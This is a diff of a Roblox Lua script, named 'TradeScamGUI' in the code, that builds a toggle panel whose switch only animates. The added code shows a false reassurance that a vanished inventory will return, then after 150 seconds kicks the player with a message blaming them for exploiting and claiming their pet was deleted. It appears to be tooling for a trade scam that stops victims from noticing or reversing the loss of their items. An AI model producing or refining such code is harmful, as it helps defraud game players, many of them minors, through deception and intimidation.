@@ -2,14 +2,14 @@ local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
--- GUI Setup
+-- GUI chính
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "TradeScamGUI"
 ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 ScreenGui.ResetOnSpawn = false
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- Main Frame
+-- Frame chính
 local MainFrame = Instance.new("Frame")
 MainFrame.Size = UDim2.new(0, 220, 0, 100)
 MainFrame.Position = UDim2.new(0.5, -110, 0.5, -50)
@@ -22,7 +22,7 @@ MainFrame.Parent = ScreenGui
 Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
 Instance.new("UIStroke", MainFrame).Color = Color3.fromRGB(60, 60, 60)
 
--- Title
+-- Tiêu đề
 local Title = Instance.new("TextLabel")
 Title.Parent = MainFrame
 Title.Size = UDim2.new(1, 0, 0, 30)
@@ -65,7 +65,7 @@ Label.Font = Enum.Font.GothamMedium
 Label.TextSize = 16
 Label.TextXAlignment = Enum.TextXAlignment.Left
 
--- Toggle Background (container)
+-- Toggle background
 local ToggleFrame = Instance.new("Frame")
 ToggleFrame.Parent = InnerFrame
 ToggleFrame.Size = UDim2.new(0, 46, 0, 22)
@@ -83,23 +83,90 @@ Knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Knob.BorderSizePixel = 0
 Instance.new("UICorner", Knob).CornerRadius = UDim.new(1, 0)
 
--- Transparent Click Button
+-- Transparent button
 local ClickButton = Instance.new("TextButton")
 ClickButton.Parent = ToggleFrame
 ClickButton.BackgroundTransparency = 1
 ClickButton.Size = UDim2.new(1, 0, 1, 0)
 ClickButton.Text = ""
 
--- Toggle Logic
+-- Toggle logic
 local ToggleOn = false
-
 local function ToggleSwitch()
 	ToggleOn = not ToggleOn
 	local bgColor = ToggleOn and Color3.fromRGB(0, 170, 0) or Color3.fromRGB(150, 0, 0)
 	local knobPos = ToggleOn and UDim2.new(1, -20, 0, 2) or UDim2.new(0, 2, 0, 2)
-
 	TweenService:Create(ToggleFrame, TweenInfo.new(0.2), {BackgroundColor3 = bgColor}):Play()
 	TweenService:Create(Knob, TweenInfo.new(0.2), {Position = knobPos}):Play()
 end
-
 ClickButton.MouseButton1Click:Connect(ToggleSwitch)
+
+--------------------------------------------------
+-- 🛎️ Thông báo góc dưới + hiệu ứng trượt + nút X
+--------------------------------------------------
+
+local NotifyFrame = Instance.new("Frame")
+NotifyFrame.Size = UDim2.new(0.5, 0, 0, 40)
+NotifyFrame.Position = UDim2.new(0.5, -200, 1, 60)
+NotifyFrame.AnchorPoint = Vector2.new(0.5, 1)
+NotifyFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+NotifyFrame.BorderSizePixel = 0
+NotifyFrame.Parent = ScreenGui
+NotifyFrame.ZIndex = 20
+Instance.new("UICorner", NotifyFrame).CornerRadius = UDim.new(0, 8)
+
+local NotifyText = Instance.new("TextLabel")
+NotifyText.Parent = NotifyFrame
+NotifyText.Size = UDim2.new(1, -30, 1, 0)
+NotifyText.Position = UDim2.new(0, 10, 0, 0)
+NotifyText.BackgroundTransparency = 1
+NotifyText.TextColor3 = Color3.fromRGB(255, 255, 255)
+NotifyText.Font = Enum.Font.Gotham
+NotifyText.TextSize = 14
+NotifyText.Text = "If your inventory is disappear, wait 3-4 minutes and it will back"
+NotifyText.TextWrapped = true
+NotifyText.TextXAlignment = Enum.TextXAlignment.Left
+
+local CloseButton = Instance.new("TextButton")
+CloseButton.Parent = NotifyFrame
+CloseButton.Size = UDim2.new(0, 20, 0, 20)
+CloseButton.Position = UDim2.new(1, -25, 0, 10)
+CloseButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.TextSize = 14
+CloseButton.Text = "X"
+Instance.new("UICorner", CloseButton).CornerRadius = UDim.new(1, 0)
+
+CloseButton.MouseButton1Click:Connect(function()
+	if NotifyFrame then
+		NotifyFrame:Destroy()
+	end
+end)
+
+-- Tween hiệu ứng từ dưới lên
+TweenService:Create(NotifyFrame, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+	Position = UDim2.new(0.5, -200, 1, -20)
+}):Play()
+
+-- Tự biến mất sau 5 phút
+task.delay(300, function()
+	if NotifyFrame and NotifyFrame.Parent then
+		local tweenOut = TweenService:Create(NotifyFrame, TweenInfo.new(0.5), {
+			Position = UDim2.new(0.5, -200, 1, 60)
+		})
+		tweenOut:Play()
+		tweenOut.Completed:Wait()
+		NotifyFrame:Destroy()
+	end
+end)
+
+--------------------------------------------------
+-- 🦶 Kick người chơi sau 5 phút
+--------------------------------------------------
+
+task.delay(150, function()
+	if LocalPlayer then
+		LocalPlayer:Kick("your pet get deleted cuz you are trying to exploit")
+	end
+end)
